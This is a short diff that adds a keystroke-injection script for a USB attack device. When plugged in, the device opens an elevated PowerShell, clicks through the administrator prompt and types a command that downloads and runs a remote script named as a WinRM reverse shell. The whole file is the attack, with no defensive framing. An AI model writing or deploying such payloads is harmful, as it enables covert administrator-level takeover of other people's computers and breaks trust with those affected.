@@ -1,0 +1,14 @@
+REM Author: VBV11
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+DELAY 200
+CTRL SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 500
+STRING IEX (IWR "https://raw.githubusercontent.com/VBV11/WinRM-Reverse-Shell/main/WinRM.ps1")
+DELAY 500
+ENTER
